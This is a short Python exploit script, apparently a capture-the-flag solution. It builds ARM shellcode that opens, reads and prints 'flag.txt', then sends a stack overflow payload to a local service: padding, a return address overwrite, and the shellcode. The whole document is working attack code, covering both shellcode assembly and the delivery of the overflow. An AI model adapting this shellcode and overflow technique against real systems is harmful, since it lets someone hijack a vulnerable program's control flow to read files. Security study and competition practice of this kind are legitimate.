asm = '''.section .text
.global _start

.ascii "%s"
_start:
    eor r4, r4, r4
    b get_addr
ret:
    mov r3, lr
open:
    mov r0, r3
    mov r1, r4
    mov r2, r4
    svc     0x00000066
read:
    mov r1, r3
    mov r2, #0x7f
    svc     0x0000006a
write:
    mov r0, #1
    mov r1, r3
    mov r2, #0x7f
    svc     0x00000069
exit:
    svc	0x00000011
get_addr:
    bl ret
.ascii "%s"
  '''
import os
from lib.mylib import *

ARCH = 'arm'
AS = ARCH + '-elf-as'
OBJDUMP = ARCH + '-elf-objdump'
FLAG = 'flag.txt'
BEGIN_MARKER = 'BEGIN_MARKER'
END_MARKER = 'END_MARKER'

asm = asm % (BEGIN_MARKER, END_MARKER)

open('/tmp/a.S', mode='wb').write(asm)
os.system(AS + ' /tmp/a.S -o /tmp/a.out')
exe = open('/tmp/a.out').read()
shellcode = exe.split(BEGIN_MARKER)[1].split(END_MARKER)[0]
print len(shellcode)
shellcode = shellcode + FLAG + '\x00'
xxd(shellcode)

IP = '127.0.0.1'
PORT = 10000
s = mysock(IP, PORT)
sl(s, '\n000')
SP = 0x1afc
shellcode = 'A' * 28 + p(SP) + shellcode + '\n'
sl(s, shellcode)
shell(s)
